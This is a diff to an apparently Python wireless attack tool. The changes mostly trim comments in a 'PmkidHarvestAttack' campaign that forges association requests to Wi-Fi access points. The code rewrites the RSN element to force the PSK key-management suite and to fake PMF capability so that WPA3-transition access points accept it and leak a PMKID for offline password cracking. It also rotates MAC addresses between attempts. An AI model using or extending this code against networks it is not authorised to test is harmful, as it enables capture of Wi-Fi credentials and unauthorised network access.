@@ -78,32 +78,24 @@ _AKM_PSK = 0x02
 # principle but lack out-of-the-box tooling — add them here when that lands.
 _HARVESTABLE_AKMS = (_AKM_PSK,)
 
-# RSN Capabilities MFPC bit (bit 7) — "MFP Capable". Set (MFPR clear) when the
-# target is PMF-capable so a WPA3→WPA2 transition AP — which advertises MFPC=1 and
-# often only associates PMF-capable STAs — accepts our forged Assoc. (HW-observed:
-# an XFSETUP transition gateway ACKed our Auth but silently dropped an MFPC=0 Assoc.)
+# RSN caps MFPC bit (bit 7). Set (MFPR clear) for PMF-capable targets — a transition
+# AP often only associates PMF-capable STAs.
 _RSN_CAP_MFPC = 0x0080
-# Group Management Cipher advertised with MFPC: BIP-CMAC-128 (00-0F-AC:6), the WPA3
-# default; sent as a 4-byte suite after RSN caps + a zero PMKID count.
+# Group Management Cipher advertised with MFPC: BIP-CMAC-128 (00-0F-AC:6).
 _BIP_CMAC_128 = b"\x00\x0f\xac\x06"
 
 
 def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK, *, pmf_capable: bool = False) -> Optional[bytes]:
     """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
-    AP's version + group + pairwise ciphers, authoring a *correct client* RSN tail.
-    Returns None if the IE is too short / malformed (caller falls back to generic).
+    AP's ciphers, authoring a client RSN tail that mirrors the AP's PMF posture:
+    ``pmf_capable`` → MFPC=1 (MFPR=0) + BIP group-mgmt (a transition AP often only
+    associates PMF-capable STAs); else clean 0x0000 caps. Drops the AP's PMKID list
+    either way; returns None if the IE is malformed (caller falls back to generic).
 
-    An Assoc Req should *select* one AKM; echoing the AP's full list claims SAE on a
-    WPA3-transition AP and gets us ignored. Forcing PSK runs the PSK 4-way → PMKID
-    in M1. The tail we author matches the AP's PMF posture (dropping its PMKID list):
-      - ``pmf_capable`` → present as a PMF-*capable* PSK client: MFPC=1 (MFPR=0),
-        PMKID-count 0, BIP group-mgmt cipher. A transition AP that only associates
-        PMF-capable STAs then accepts us. (M1 is pre-PTK EAPOL, still unprotected.)
-      - else → clean 0x0000 caps, no MFP tail.
-    Neither echoes the AP's raw tail (MFPR/PMKID list) — that inconsistent profile
-    was a suspected cause of the transition-AP 'M1 not found'. RSNE body layout:
-    version(2) group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)]
-    [pmkid_count(2) pmkid...] [group-mgmt(4)]."""
+    Selecting one PSK AKM (not echoing the AP's full list, which claims SAE and gets
+    us ignored) runs the PSK 4-way → PMKID in M1. RSNE body layout: version(2)
+    group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)] [pmkid_count(2)
+    pmkid...] [group-mgmt(4)]."""
     if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
         return None
     body = rsn_ie[2:2 + rsn_ie[1]]
@@ -330,16 +322,12 @@ class PmkidHarvestAttack(Campaign):
             logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
                         self.target.bssid, self.target.akm_suites)
             return
-        # Feed the generic through _force_psk_akm too (it's a valid RSN IE) so the PMF
-        # posture applies even when we never captured the AP's own RSN IE.
+        # The generic is a valid RSN IE, so route it through _force_psk_akm too when
+        # we never captured the AP's own — the PMF posture still applies.
         base_rsn = self.target.rsn_ie or _GENERIC_RSN_IE
         self._assoc_rsn_ie = (
             _force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or _GENERIC_RSN_IE
         )
-        # What we actually advertise on the wire — AKM + the authored RSN caps.
-        # Key diagnostic for the transition-AP 'M1 not found': confirms the PMF
-        # posture we present (MFPC mirrors the AP), so an Assoc the AP still drops or
-        # an M1 that lands Protected is narrowed to the AP's own behaviour.
         logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x, mfp_capable=%s): %s",
                     akm, self.target.pmf_capable, self._assoc_rsn_ie.hex())
 
@@ -407,8 +395,7 @@ class PmkidHarvestAttack(Campaign):
             )
             self._rotate_mac()
 
-        # Exhausted every attempt. Distinguish a truly silent AP from one whose M1
-        # arrived encrypted (PMF/transition) and was routed to unreadable "data".
+        # Distinguish a silent AP from one whose M1 arrived encrypted (→ PROTECTED).
         self.fail_reason = PmkidFail.PROTECTED if saw_protected else PmkidFail.NO_RESPONSE
 
     async def teardown(self) -> None:
